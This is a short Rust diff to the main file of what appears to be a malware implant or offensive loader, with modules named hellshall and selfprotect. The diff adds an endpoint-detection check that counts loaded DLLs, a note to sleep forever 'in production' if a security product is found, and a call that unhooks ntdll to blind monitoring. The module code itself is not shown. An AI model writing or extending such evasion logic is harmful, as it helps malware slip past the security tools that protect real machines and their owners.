@@ -25,6 +25,8 @@ mod hellshall;
 mod selfprotect;
 mod worker;
 mod helpers;
+mod edrcheck;
+mod unhook;
 
 use std::{thread, time::Duration};
 
@@ -47,6 +49,21 @@ fn main() {
             }
             _ => {}
         }
+    }
+
+    // === EDR CHECK: count loaded DLLs ===
+    let dll_count = unsafe { edrcheck::count_loaded_modules() };
+    if dll_count > config::MAX_LOADED_DLLS {
+        eprintln!("[!] EDR detected: {} DLLs loaded (threshold: {})", dll_count, config::MAX_LOADED_DLLS);
+        // TODO: in production, enter infinite sleep instead:
+        // loop { std::thread::sleep(std::time::Duration::from_secs(u64::MAX)); }
+    } else {
+        eprintln!("[+] DLL count OK: {} (threshold: {})", dll_count, config::MAX_LOADED_DLLS);
+    }
+
+    // === NTDLL UNHOOKING ===
+    unsafe {
+        unhook::unhook_ntdll();
     }
 
     selfprotect::set_process_security_descriptor();
